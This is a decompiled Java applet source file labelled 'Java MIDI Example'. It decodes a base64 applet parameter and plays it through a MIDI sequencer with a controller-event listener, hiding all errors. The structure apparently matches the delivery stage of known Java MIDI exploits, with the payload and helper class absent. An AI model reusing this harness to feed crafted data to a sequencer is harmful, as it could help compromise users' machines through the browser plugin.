import javax.sound.midi.MidiDevice;
import javax.sound.midi.ControllerEventListener;
import javax.sound.midi.Sequencer;
import javax.sound.midi.MidiSystem;
import java.io.InputStream;
import java.io.ByteArrayInputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class MIDIExample extends Applet
{
    @Override
    public void init() {
        this.Process();
    }
    
    private void Process() {
        try {
            final String File = this.getParameter("Param");
            final byte[] bytes = base64_decode(File);
            final ByteArrayInputStream iStream = new ByteArrayInputStream(bytes);
            this.CreateMIDIDevice(iStream);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static byte[] base64_decode(final String s) {
        final String charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        int end = 0;
        if (s.endsWith("=")) {
            ++end;
        }
        if (s.endsWith("==")) {
            ++end;
        }
        final int len = (s.length() + 3) / 4 * 3 - end;
        final byte[] result = new byte[len];
        int dst = 0;
        try {
            for (int src = 0; src < s.length(); ++src) {
                final int code = charSet.indexOf(s.charAt(src));
                if (code == -1) {
                    break;
                }
                switch (src % 4) {
                    case 0: {
                        result[dst] = (byte)(code << 2);
                        break;
                    }
                    case 1: {
                        final byte[] array = result;
                        final int n = dst++;
                        array[n] |= (byte)(code >> 4 & 0x3);
                        result[dst] = (byte)(code << 4);
                        break;
                    }
                    case 2: {
                        final byte[] array2 = result;
                        final int n2 = dst++;
                        array2[n2] |= (byte)(code >> 2 & 0xF);
                        result[dst] = (byte)(code << 6);
                        break;
                    }
                    case 3: {
                        final byte[] array3 = result;
                        final int n3 = dst++;
                        array3[n3] |= (byte)(code & 0x3F);
                        break;
                    }
                }
            }
        }
        catch (ArrayIndexOutOfBoundsException ex) {}
        return result;
    }
    
    private void CreateMIDIDevice(final InputStream Input) {
        try {
            final int[] controllersOfInterest = { 0 };
            final MIDIExampleHelper Helper = new MIDIExampleHelper();
            final MidiDevice.Info[] mDeviceInfo = MidiSystem.getMidiDeviceInfo();
            final MidiDevice mDevice = MidiSystem.getMidiDevice(mDeviceInfo[0]);
            Sequencer zSEQ = null;
            zSEQ = (Sequencer)mDevice;
            zSEQ.open();
            zSEQ.addControllerEventListener(Helper, controllersOfInterest);
            zSEQ.setSequence(Input);
            zSEQ.start();
        }
        catch (Exception ex) {}
    }
    
    @Override
    public String getAppletInfo() {
        return "Java MIDI Example";
    }
}
